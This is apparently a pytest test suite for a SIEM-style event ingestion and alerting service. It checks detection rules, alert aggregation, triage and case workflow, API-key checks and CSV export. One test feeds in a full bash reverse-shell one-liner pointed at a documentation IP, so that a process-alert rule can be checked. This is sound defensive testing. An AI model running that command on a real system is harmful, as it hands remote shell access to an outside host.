def test_health(client):
    r=client.get('/health'); assert r.status_code==200; assert r.json()['status']=='ok'

def test_generic_event(client):
    r=client.post('/api/events',json={'source':'linux','host':'x','event_type':'auth','message':'hello'})
    assert r.status_code==200
    assert r.json()['event_id'] > 0
    assert client.get('/api/events').json()[0]['message']=='hello'

def test_suricata_high_alert(client):
    r=client.post('/api/ingest/suricata',json={
        'event_type':'alert','src_ip':'198.51.100.1','dest_ip':'10.0.0.2',
        'alert':{'severity':1,'signature':'Test high alert'}
    })
    assert r.status_code==200
    alerts=client.get('/api/alerts').json()
    assert any(a['rule_id']=='SURICATA-HIGH' for a in alerts)

def test_windows_admin_group_alert(client):
    client.post('/api/ingest/windows',json={'EventID':4732,'TargetUserName':'bob','message':'Added to Administrators'})
    alerts=client.get('/api/alerts').json()
    assert any(a['rule_id']=='WIN-PRIV-GROUP' for a in alerts)

def test_reverse_shell_alert(client):
    client.post('/api/events',json={'source':'linux','host':'web','event_type':'process','message':'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'})
    alerts=client.get('/api/alerts').json()
    assert any(a['rule_id']=='PROC-REVERSE-SHELL' for a in alerts)

def test_ssh_bruteforce_alert(client):
    for _ in range(6):
        client.post('/api/ingest/linux',json={'host':'srv','event_type':'ssh_failed','src_ip':'203.0.113.77','message':'Failed password for root from 203.0.113.77'})
    alerts=client.get('/api/alerts').json()
    assert any(a['rule_id']=='LINUX-SSH-BRUTE' for a in alerts)


def test_alerts_are_aggregated_during_cooldown(client):
    for _ in range(7):
        client.post('/api/ingest/linux', json={
            'host':'srv', 'event_type':'ssh_failed', 'src_ip':'203.0.113.9',
            'message':'Failed password for guest from 203.0.113.9',
        })
    alerts = [a for a in client.get('/api/alerts').json() if a['rule_id']=='LINUX-SSH-BRUTE']
    assert len(alerts) == 1
    assert alerts[0]['occurrence_count'] == 3


def test_historical_events_correlate_by_event_time(client):
    for second in range(6):
        client.post('/api/ingest/linux', json={
            'timestamp':f'2025-01-01T10:00:{second:02d}Z', 'host':'archive',
            'event_type':'ssh_failed', 'src_ip':'198.51.100.90',
            'message':'Failed password for root from 198.51.100.90',
        })
    alerts = client.get('/api/alerts').json()
    assert any(a['rule_id']=='LINUX-SSH-BRUTE' for a in alerts)


def test_windows_log_clear_detection(client):
    client.post('/api/ingest/windows', json={
        'EventID':1102, 'Computer':'dc-01', 'TargetUserName':'operator',
        'message':'The audit log was cleared',
    })
    alerts = client.get('/api/alerts').json()
    assert any(a['rule_id']=='WIN-LOG-CLEARED' for a in alerts)


def test_case_note_and_triage_workflow(client):
    client.post('/api/ingest/suricata', json={
        'event_type':'alert', 'src_ip':'198.51.100.8', 'dest_ip':'10.0.0.5',
        'alert':{'severity':1, 'signature':'Test investigation alert'},
    })
    alert_id = client.get('/api/alerts').json()[0]['id']
    update = client.patch(f'/api/alerts/{alert_id}', json={
        'status':'investigating', 'assignee':'aymen',
    })
    assert update.status_code == 200
    note = client.post(f'/api/alerts/{alert_id}/notes', json={
        'author':'aymen', 'body':'Checked the source address and started containment.',
    })
    assert note.status_code == 200
    case = client.post('/api/cases', json={
        'title':'Investigate IDS activity', 'severity':'high', 'alert_ids':[alert_id],
    })
    assert case.status_code == 200
    assert case.json()['alert_count'] == 1
    detail = client.get(f'/api/alerts/{alert_id}').json()
    assert detail['assignee'] == 'aymen'
    assert detail['case_id'] == case.json()['id']
    assert detail['notes'][0]['author'] == 'aymen'
    assert client.get('/api/audit').status_code == 200


def test_ingestion_api_key(client, monkeypatch):
    monkeypatch.setenv('SIEM_INGEST_API_KEY', 'test-secret')
    body = {'source':'linux', 'host':'x', 'message':'hello'}
    assert client.post('/api/events', json=body).status_code == 401
    assert client.post('/api/events', json=body, headers={'X-API-Key':'test-secret'}).status_code == 200


def test_bulk_limit_is_not_silently_truncated(client):
    rows = [{'source':'api', 'message':'x'}] * 5001
    response = client.post('/api/events/bulk', json=rows)
    assert response.status_code == 413


def test_alert_csv_export(client):
    client.post('/api/ingest/windows', json={
        'EventID':4720, 'TargetUserName':'new-user', 'message':'A user account was created',
    })
    response = client.get('/api/export/alerts.csv')
    assert response.status_code == 200
    assert 'WIN-ACCOUNT-CREATED' in response.text
